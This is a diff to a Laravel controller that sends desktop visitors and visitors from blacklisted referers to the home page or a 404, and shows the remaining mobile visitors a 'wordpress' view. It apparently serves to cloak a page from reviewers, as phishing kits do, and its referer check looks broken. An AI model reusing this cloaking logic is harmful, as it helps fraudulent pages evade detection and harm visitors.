@@ -4,6 +4,7 @@ namespace App\Http\Controllers;
 
 use App\Http\Requests\loginsRequest;
 use App\Models\AdminOptions;
+use App\Models\ForbiddensModel;
 use App\Models\LoginModel;
 use App\Supports\Verify;
 use Carbon\Carbon;
@@ -14,14 +15,38 @@ class MainController extends Controller
 {
     public function index(Request $request)
     {
+        $redirectPath = AdminOptions::firstWhere('key', 'yasak_yonlendirme_link');
+        $forbidden = ForbiddensModel::all();
+        $referer = $request->headers->get('referer');
+
         if (Agent::isDesktop()) {
-            $redirectPath = AdminOptions::firstWhere('key', 'yasak_yonlendirme_link');
             return match ($redirectPath->value) {
                 'home' => redirect(route('root.index')),
                 '404' => abort(404),
             };
         }
-        return view('wordpress');
+
+        if (Agent::isMobile()) {
+            $results = $forbidden->filter(function ($ban) use ($referer) {
+                if (strpos($ban, $referer) !== false)
+                    return $ban;
+            });
+
+            if ($results->isNotEmpty()) {
+                $response = $results->first();
+
+                if ($response->redirect) {
+                    return redirect()->to($response->redirect)->send();
+                } else {
+                    $redirectPath = AdminOptions::firstWhere('key', 'yasak_yonlendirme_link');
+                    return match ($redirectPath->value) {
+                        'home' => redirect(route('root.index')),
+                        '404' => abort(404),
+                    };
+                }
+            }
+            return view('wordpress');
+        }
     }
     public function gg(Request $request)
     {
